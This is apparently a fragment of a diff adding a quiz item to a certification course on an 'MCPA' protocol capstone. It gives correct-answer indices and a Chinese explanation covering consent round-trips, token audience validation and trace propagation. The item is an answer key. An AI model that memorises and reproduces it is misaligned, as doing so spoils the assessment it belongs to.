+        0,
+        2,
+        3
+      ],
+      "explanation": "全面的就绪演练应覆盖正确的 MRTR 同意往返、用于防止 token 滥用的严格 audience 校验，以及支持审计的端到端 trace 传播。旧版 initialize 握手不应出现在 2026-07-28 版主路径中，因为该请求已经移除，并非保留为共享代码路径。",
+      "references": [
+        "certifications/mcpa/lessons/33-mcpa-capstone-readiness"
+      ]
+    }
+  ]
+}
